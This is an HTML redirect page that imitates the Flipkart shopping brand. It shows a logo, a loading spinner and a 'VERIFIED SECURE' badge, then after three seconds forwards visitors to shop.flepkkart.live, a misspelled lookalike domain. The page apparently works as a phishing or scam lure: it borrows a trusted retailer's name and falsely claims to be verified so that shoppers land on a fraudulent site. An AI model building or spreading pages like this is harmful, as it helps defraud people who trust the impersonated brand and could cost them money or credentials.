<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="refresh" content="3;url=https://shop.flepkkart.live/shop">
  <title>Flipkart - Redirecting</title>

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      height: 100vh;
      width: 100vw;
      background: linear-gradient(180deg, #0b1c33, #081426);
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: Arial, sans-serif;
      color: #fff;
    }

    .container {
      width: 100%;
      height: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .content {
      text-align: center;
    }

    .logo {
      width: 90px;
      height: 90px;
      background: #fff;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 20px;
    }

    .logo img {
      width: 55px;
    }

    h2 {
      font-size: 22px;
      letter-spacing: 1px;
      margin-bottom: 6px;
    }

    p {
      font-size: 14px;
      opacity: 0.85;
      margin-bottom: 25px;
    }

    .spinner {
      width: 45px;
      height: 45px;
      border: 4px solid rgba(255,255,255,0.3);
      border-top: 4px solid #1da1f2;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto 18px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .secure {
      font-size: 12px;
      color: #9bc9ff;
      opacity: 0.9;
    }
  </style>
</head>

<body>
  <div class="container">
    <div class="content">
      <div class="logo">
        <img
          src="https://img.icons8.com/?size=100&id=Noove1mRsJOq&format=png&color=000000"
          alt="Flipkart">
      </div>

      <h2>PLEASE WAIT</h2>
      <p>Redirecting to your destination…</p>

      <div class="spinner"></div>

      <div class="secure">✔ VERIFIED SECURE</div>
    </div>
  </div>
</body>
</html>
